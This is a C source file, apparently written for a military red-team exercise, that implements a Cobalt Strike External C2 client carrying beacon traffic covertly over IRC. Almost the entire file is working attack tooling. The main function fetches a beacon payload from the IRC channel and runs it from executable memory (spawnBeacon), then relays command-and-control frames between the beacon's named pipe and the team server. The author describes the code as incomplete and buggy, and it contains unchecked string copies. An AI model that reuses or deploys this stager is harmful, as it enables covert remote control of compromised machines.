/**
 * TestClient.c
 * by Lt Daniel Fitzgerald
 * Red Flag 19-3 - July 2019
 *
 * Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.
 * This was created as a fall back to get basic functionality in a short amount of developemnt time. It is not complete and has errors.
 * Instead of using cloakify to convert B64 messages to normal looking strings, it just sends the B64 message over IRC.
 *
 * Update 15 Jan 2020: Fixed the bug causing errors when transfering large ammounts of data.
 *
 */

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment (lib, "Ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h> 
#include <stdlib.h>
#include "b64.h"

#define MAX 4096
// Mudge used these values in his example
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024

#define SA struct sockaddr

// Struct to hold info on the IRC session
struct IRCinfo
{
	char NICK[50];
	char OP_NICK[50];
	char OP_PASS[50];
	char USER[50];
	char REALNAME[50];
	char CHANNEL[50];
	char TGTNICK[50];
	char TRAFFIC_STR[50];
	char LEN_STR[50];
	char START_STR[50];
	char PIPE_STR[50];
	char privmsg[8];
	char ping[5];
	char pong[5];
	char nick_str[5];
	char pass[5];
	char user_str[5];
	char userhost[9];
	char join[5];
	char oper[5];
};


/**
 * Allocates a RWX page for the CS beacon, copies the payload, and starts a new thread
 *
 * @param payload Pointer to a buffer containing a Cobalt Strike beacon payload to be alloc'd and run
 * @param len Length of the payload buffer
 */
void spawnBeacon(char* payload, DWORD len) {

	HANDLE threadHandle;
	DWORD threadId = 0;
	char* alloc = (char*)VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(alloc, payload, len);

	threadHandle = CreateThread(NULL, (SIZE_T)NULL, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, &threadId);
}


/**
 * Creates a socket connection in Windows
 *
 * @param ip A pointer to an array containing the IP address to connect to
 * @param port A pointer to an array containing the port to connect on
 * @return A socket handle for the connection
*/
SOCKET create_socket(char* ip, char* port)
{
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	WSADATA wsaData;
	struct addrinfo* result = NULL, * ptr = NULL, hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return INVALID_SOCKET;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Attempt to connect to the first address returned by the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// free the resources returned by getaddrinfo and print an error message
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return INVALID_SOCKET;
	}
	return ConnectSocket;
}

/**
 * Formats variable arguments into a buffer and sends them to the IRC server
 *
 * @param sockfd A socket file descriptor
 * @param text, ... Variable arguments to format and store into a buffer
 * @return number of bytes sent
 */
int sendargv(SOCKET sockfd, char* text, ...)
{
	//TODO: check if this MAX is correct. Maybe change to malloc sizeof(text)?
	static char sendbuff[MAX];
	memset(sendbuff, 0, sizeof(sendbuff));
	va_list ap;
	va_start(ap, text);
	vsprintf(sendbuff, text, ap);
	va_end(ap);

	return send(sockfd, sendbuff, strlen(sendbuff), 0);
}


/**
 * Sends data to our C2 controller (via IRC) received from our injected beacon
 *
 * @param sd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 * @param data A pointer to an array containing data to send
 * @param len Length of data to send
 * @return Return value, 0 is success
*/
int sendData(SOCKET sd, struct IRCinfo ircinfo, const char* data, DWORD len) {
	char* buffer = (char*)malloc(len + 4);
	if (buffer == NULL)
	{
		printf("Malloc failed..\n");
		return -1;
	}
	memset(buffer, 0, sizeof(len+4));
	char* bufferfixed;
	DWORD bytesWritten = 0;

	*(DWORD*)buffer = len;
	memcpy(buffer + 4, data, len);

	// Base64 encode the data
	int b64len;
	char* encodedmsg = base64(buffer, len+4, &b64len);

	// Make sure it ends in == so the server knows the end
	// TODO: Remove this dependency by sending the size
	// memcpy(bufferfixed, b64len, 4);
	// memcpy(bufferfixed + 4, encodedmsg, b64len);
	if (strstr(encodedmsg, "=="))
	{
		bufferfixed = encodedmsg;
	}
	else if (strstr(encodedmsg, "="))
	{
		b64len += 1;
		bufferfixed = encodedmsg;
		strcat(bufferfixed, "=");
	}
	else
	{
		b64len += 2;
		bufferfixed = encodedmsg;
		strcat(bufferfixed, "==");
	}
	// Break message up to send a max of ~500 bytes of data per IRC message (RFC says 512)
	// TODO: check 425 number and define it at top
	char* partial = (char*)malloc(426);
	int offset = 0;
	while (offset < b64len)
	{
		if (offset + 425 >= b64len)
		{
			memset(partial, 0, 425);
			memcpy(partial, bufferfixed + offset, b64len-offset);
			sendargv(sd, "%s #%s :%s-%s\r\n", ircinfo.privmsg, ircinfo.CHANNEL, ircinfo.TRAFFIC_STR, partial);
			break;
		}
		else
		{
			memset(partial, 0, 426);
			memcpy(partial, bufferfixed + offset, 425);
			sendargv(sd, "%s #%s :%s-%s\r\n", ircinfo.privmsg, ircinfo.CHANNEL, ircinfo.TRAFFIC_STR, partial);
			offset += 425;
			Sleep(200);
		}
	}
	
	free(partial);
	free(buffer);
	return 0;
}


/**
 * Receives data from our C2 controller to be relayed to the injected beacon
 * TODO: Refactor this function!
 *
 * @param sd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 * @param len Length of data to send
 * @return A pointer to an array containing the received data
*/
DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
	DWORD size = 0;

	// IRC recv loop
	char recvbuff[MAX+1];
	char* msgbuff = NULL;
	BOOL msgcompleteflag = FALSE;
	//char privDmExitMsg[64];
	//sprintf(privDmExitMsg, "PRIVMSG %s :exit", ircinfo.NICK);
	//char privChanExitMsg[64];
	//sprintf(privChanExitMsg, "PRIVMSG #%s :exit", ircinfo.CHANNEL);
	char privChanPING[64];
	sprintf(privChanPING, "%s #%s :%s", ircinfo.privmsg, ircinfo.CHANNEL, ircinfo.ping);
	int msgbuff_len = 0;
	char* leftover = NULL;
	char* buff = NULL;

	while(1)
	{
		memset(recvbuff, 0, sizeof(recvbuff));
		// Recv 4096 bytes
		recv(sd, recvbuff, 4096, 0);
		printf("From Server : %s", recvbuff);
		if (leftover != NULL)
		{
			buff = leftover;
			// This is probably wrong..
			strncat(buff, recvbuff, sizeof(recvbuff));
		}
		else
		{
			buff = recvbuff;
		}
		
		if (buff[strlen(buff) - 1] == '\n')
		{
			buff[strlen(buff) - 1] = '\0';
		}
		char* lenptr = strstr(buff, ircinfo.LEN_STR);
		if (lenptr)
		{
			char* msg_end = "\0";
			// Length of LEN_STR +1 for '-'
			int len_str_len = strlen(ircinfo.LEN_STR);
			lenptr += (len_str_len + 1);
			// Find end of message
			msg_end = strstr(lenptr, "\r");
			if (msg_end == NULL)
			{
				printf("End of msg not found, likely hit 4096 read limit. msg_end was NULL\n");
				leftover = msg_end;
				break;
			}
			// Length of len msg
			int len_len = msg_end - lenptr;
			// Increment msg_end to end
			msg_end += 1;
			// Null terminate it
			if (lenptr != NULL && lenptr[len_len] != '\0')
			{
				lenptr[len_len] = '\0';
			}
			printf("Encoded msg len:%s\n", lenptr);
			
			// Convert to int
			sscanf(lenptr, "%d", &msgbuff_len);
			msgbuff_len += 1;
			printf("As int +1: %d\n",msgbuff_len);
			// Malloc buffer to store incomming msg
			msgbuff = (char*)malloc(msgbuff_len);
			if (msgbuff == NULL)
				return -1;
			memset(msgbuff, 0, msgbuff_len);
		}
		char* trafficptr = strstr(buff, ircinfo.TRAFFIC_STR);
		if (trafficptr && (msgbuff != NULL))
		{
			char* msg_end = "\0";
			// Iterate through every message in the IRC packet, there can be more than one
			while (trafficptr != 0 && strlen(trafficptr) > 2)
			{
				printf("Encoded message recv\n");
				// Length of TRAFFIC_STR +1 for '-'
				int traffic_str_len = strlen(ircinfo.TRAFFIC_STR);
				trafficptr += (traffic_str_len + 1);
				// Find end of message (\r\n but the final \n of the packet has been changed to \0)
				msg_end = strstr(trafficptr, "\r");
				// printf("msg_end: %s\n", msg_end);
				if (msg_end == NULL)
				{
					printf("End of msg not found, likely hit 4096 read limit. msg_end was NULL\n");
					leftover = msg_end;
					break;
				}
				// Calculate length of message
				int msg_len = msg_end - trafficptr;
				// Increment msg_end to either end of message or to 1 character before next message
				msg_end += 1;
				// Null terminate it so we can use cloakptr as the message string
				if (trafficptr != NULL && trafficptr[msg_len] != '\0')
				{
					trafficptr[msg_len] = '\0';
				}
				if (msg_end == 0)
				{
					printf("Error: msg_end was 0\n");
					break;
				}
				else
				{
					// Copy msg into msgbuffer
					strcat(msgbuff, trafficptr);
					// If there are no more messages in this packet - break, else find the next cloakptr
					if (strlen(msg_end) < 2)
					{
						
						if (strstr(msg_end - 3, "=="))
						{
							msgcompleteflag = TRUE;
						}
						printf("breaking..\n");
						break;
					}
					else
					{
						printf("Multi message packet\n");
					}
					trafficptr = strstr(msg_end, ircinfo.TRAFFIC_STR);
					if (!trafficptr)
					{
						// Didn't find TRAFFIC_STR string
						if (strstr(msg_end - 3, "=="))
						{
							// Found == though
							msgcompleteflag = TRUE;
						}
						break;
					}
				}
			}
		}
		// int result = pingcheck(sd, recvbuff, buffer)
		// if (result == 1)
		// {return 1;}
		char pingstr[7];
		strcpy(pingstr, ircinfo.ping);
		strcat(pingstr, " :");
		if (strstr(recvbuff, pingstr))
		{
			printf("PING! sending PONG.\n");
			char* pingsvr = strstr(recvbuff, pingstr);
			pingsvr += strlen(pingstr);
			sendargv(sd, "%s :%s\n", ircinfo.pong, pingsvr);
		}
		else if (strstr(recvbuff, privChanPING))
		{
			char* nullbyte = "\0";
			memcpy(buffer, nullbyte, 1);
			return 1;
		}
		// result = exitcheck(sd, ircinfo, recvbuff)
		// if (result == -1)
		// {break;}
		// Check if exit message in DM or channel
		//if (strstr(recvbuff, privDmExitMsg) || strstr(recvbuff, privChanExitMsg))
		//{
		//	sendargv(sd, "PRIVMSG #%s :quitting\r\n", ircinfo.CHANNEL);
		//	sendargv(sd, "QUIT :\r\n");
		//}
		// Check if ERROR message
		if (strstr(recvbuff, "ERROR"))
		{
			printf("Server sent Error...\n");
			if (strstr(recvbuff, "Closing Link"))
			{
				printf("Error was to close link!\n");
			}
			break;
		}
		// Break if multipacket message is finished
		if (msgcompleteflag)
		{
			break;
		}
	}
	// end of IRC recv loop

	// printf("Encoded msg:%s\n", msgbuff);
	int unb64len;
	char* decodedmsg = unbase64(msgbuff, msgbuff_len + 1, &unb64len);

	memcpy((char *)&size, decodedmsg, 4);
	printf("Msg len: %d\n", size);
	// printf("unb64len: %d\n", unb64len);
	if (size < 0)
	{
		printf("Error: size < 0\n");
		return -1;
	}
	memcpy(buffer, decodedmsg + 4, size);
	free(msgbuff);
	return size;
}


/**
 * Connects to the name pipe spawned by the injected beacon
 *
 * @param pipeName Pointer to a buffer containing the name of the pipe to connect to
 * @return A handle to the beacon named pipe
 */
HANDLE connectBeaconPipe(const char* pipeName) {
	HANDLE beaconPipe;

	beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);

	return beaconPipe;
}


/**
 * Read a frame from a handle
 * 
 * @param my_handle Handle to beacons SMB pipe
 * @param buffer buffer to read data into
 * @param max unused
 * @return size of data read
 */
DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;
	/* read the 4-byte length */
	ReadFile(my_handle, (char *)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}


/**
 * Write a frame to a file
 * 
 * @param my_handle Handle to beacons SMB pipe
 * @param buffer buffer containing data to send
 * @param length length of data to send
 */
void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}


/**
 * Sets up initial connection to IRC server
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 */
void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
{
	sendargv(sockfd, "%s %s\r\n", ircinfo.pass, ircinfo.OP_PASS);
	sendargv(sockfd, "%s %s\r\n", ircinfo.nick_str, ircinfo.NICK);
	sendargv(sockfd, "%s %s %s %s :%s\r\n", ircinfo.user_str, ircinfo.USER, "0", "*", ircinfo.REALNAME);

	char recvbuff[MAX];
	while(1)
	{
		memset(recvbuff, 0, sizeof(recvbuff));
		recv(sockfd, recvbuff, sizeof(recvbuff), 0);
		printf("From Server : %s", recvbuff);

		if (recvbuff[strlen(recvbuff) - 1] == '\n')
		{
			recvbuff[strlen(recvbuff) - 1] = '\0';
		}
		if (strstr(recvbuff, "MODE "))
		{
			printf("Connection done?\n");
			break;
		}
		char pingstr[7];
		strcpy(pingstr, ircinfo.ping);
		strcat(pingstr, " :");
		if (strstr(recvbuff, pingstr))
		{
			printf("PING! sending PONG.\n");
			char* pingsvr = strstr(recvbuff, pingstr);
			pingsvr += strlen(pingstr);
			sendargv(sockfd, "%s :%s\n", ircinfo.pong, pingsvr);
		}
	}

	sendargv(sockfd, "%s %s\r\n", ircinfo.userhost, ircinfo.USER);
	memset(recvbuff, 0, sizeof(recvbuff));
	recv(sockfd, recvbuff, sizeof(recvbuff), 0);
	printf("From Server : %s", recvbuff);
}

/**
 * Sends the command to join to a channel
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 */
void ircjoin(SOCKET sockfd, struct IRCinfo ircinfo)
{
	sendargv(sockfd, "%s #%s\r\n", ircinfo.join, ircinfo.CHANNEL);
}


/**
 * Sends the command to become an operator on the IRC server
 * 
 * NOTE: This requires knowing the operator nick and password. This is only useful if you have edited the IRC server .conf file.
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 */
void becomeoper(SOCKET sockfd, struct IRCinfo ircinfo)
{
	sendargv(sockfd, "%s %s %s\r\n", ircinfo.oper, ircinfo.OP_NICK, ircinfo.OP_PASS);
}


/**
 * Sends the command to start c2
 *
 * @param sockfd A socket file descriptor
 * @param ircinfo A struct with the users IRC info (such as NICK and CHANNEL)
 */
void cloakstart(SOCKET sockfd, struct IRCinfo ircinfo)
{
	sendargv(sockfd, "%s #%s :%s\r\n", ircinfo.privmsg, ircinfo.CHANNEL, ircinfo.START_STR);
}


/**
 * Main function. Connects to IRC server over TCP, gets beacon and spawns it, then enters send/recv loop
 *
 */
void main(int argc, char* argv[])
{
	// Set connection and IRC info
	if (argc != 15)
	{
		printf("Incorrect number of args: %d\n", argc);
		printf("Incorrect number of args: IRCexternalC2.exe [IP] [PORT] [NICK] [OP_NICK] [OP_PASS] [USER] [REALNAME] [CHANNEL] [TGTNICK] [SLEEP(ms)] [TRAFFIC_STR] [LEN_STR] [START_STR] [PIPE_STR]");
		printf("Values should be no more than 49 bytes.\n");
		exit(1);
	}
	char* IP = argv[1];
	char* PORT = argv[2];
	struct IRCinfo ircinfo;
	strcpy(ircinfo.NICK, argv[3]);
	strcpy(ircinfo.OP_NICK, argv[4]);
	strcpy(ircinfo.OP_PASS, argv[5]);
	strcpy(ircinfo.USER, argv[6]);
	strcpy(ircinfo.REALNAME, argv[7]);
	strcpy(ircinfo.CHANNEL, argv[8]);
	strcpy(ircinfo.TGTNICK, argv[9]);
	long sleep_timer = strtol(argv[10],NULL, 10);
	strcpy(ircinfo.TRAFFIC_STR, argv[11]);
	strcpy(ircinfo.LEN_STR, argv[12]);
	strcpy(ircinfo.START_STR, argv[13]);
	strcpy(ircinfo.PIPE_STR, argv[14]);
	strcpy(ircinfo.privmsg, "PRIVMSG");
	strcpy(ircinfo.ping, "PING");
	strcpy(ircinfo.pong, "PONG");
	strcpy(ircinfo.nick_str, "NICK");
	strcpy(ircinfo.pass, "PASS");
	strcpy(ircinfo.user_str, "USER");
	strcpy(ircinfo.userhost, "USERHOST");
	strcpy(ircinfo.join, "JOIN");
	strcpy(ircinfo.oper, "OPER");

	DWORD payloadLen = 0;
	char* payloadData = NULL;
	HANDLE beaconPipe = INVALID_HANDLE_VALUE;

	// Create a connection back to our C2 controller
	SOCKET sockfd = INVALID_SOCKET;

	sockfd = create_socket(IP, PORT);
	if (sockfd == INVALID_SOCKET)
	{
		printf("Socket creation error!\n");
		exit(1);
	}

	// Connect to IRC application
	ircconnect(sockfd, ircinfo);
	// Join a channel
	ircjoin(sockfd, ircinfo);
	// Send command to become operator
	becomeoper(sockfd, ircinfo);

	// Send command to tell server to connect to Team Server and send beacon payload
	Sleep(500);
	cloakstart(sockfd, ircinfo);

	// Recv beacon payload
	char * payload = (char *)malloc(PAYLOAD_MAX_SIZE);
	DWORD payload_size = recvData(sockfd, ircinfo, payload, BUFFER_MAX_SIZE);
	if (payload_size < 0)
	{
		printf("recvData error, exiting\n");
		exit(1);
	}
	printf("Recv %d bytes from TS\n", payload_size);
	// Start CS beacon
	spawnBeacon(payload, payload_size);
	// Loop unstil the pipe is up and ready to use
	while (beaconPipe == INVALID_HANDLE_VALUE) {
		// Create our IPC pipe for talking to the C2 beacon
		Sleep(500);
		// 50 (max size of PIPE_STR) + 13 (size of "\\\\.\\pipe\\")
		char pipestr[50+13]= "\\\\.\\pipe\\";
		// Pipe str (i.e. "mIRC")
		strcat(pipestr, ircinfo.PIPE_STR);
		// Full string (i.e. "\\\\.\\pipe\\mIRC")
		beaconPipe = connectBeaconPipe(pipestr);
	}
	printf("Connected to pipe!!\n");

	// Mudge used 1MB max in his example, test this
	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
	if (buffer == NULL)
	{
		printf("buffer malloc failed!\n");
		exit(1);
	}

	while (1) {
		// Start the pipe dance
		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
		if (read_size < 0)
		{
			printf("read_frame error, exiting\n");
			break;
		}
		printf("Recv %d bytes from beacon\n", read_size);
		// Sleep so we do not constantly send data if there is no change
		if (read_size == 1)
		{
			Sleep(sleep_timer);
		}

		int rv = sendData(sockfd, ircinfo, buffer, read_size);
		if (rv == -1)
		{
			printf("sendData error, exiting..\n");
			break;
		}
		printf("Sent to TS\n");
		
		read_size = recvData(sockfd, ircinfo, buffer, BUFFER_MAX_SIZE);
		if (read_size < 0)
		{
			printf("recvData error, exiting\n");
			break;
		}
		printf("Recv %d bytes from TS\n", read_size);

		write_frame(beaconPipe, buffer, read_size);
		printf("Sent to beacon\n");
	}
	free(payload);
	free(buffer);
	closesocket(sockfd);
	CloseHandle(beaconPipe);

	exit(0);
}

